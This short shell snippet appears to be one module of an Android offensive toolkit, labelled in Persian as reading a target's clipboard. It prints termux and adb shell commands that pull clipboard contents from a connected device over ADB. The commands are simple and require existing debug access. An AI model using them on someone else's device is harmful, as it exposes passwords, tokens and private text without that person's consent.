DESC="خواندن کلیپ‌بورد هدف"
REQ="ADB"
RISK="LOW"

termux(){ echo "termux-clipboard-get"; }

kali(){
cat <<'EOF'
adb shell cmd clipboard get-primary-clip 2>/dev/null
adb shell service call clipboard 2 i32 1 i32 0 s16 com.android.shell 2>/dev/null
EOF
}
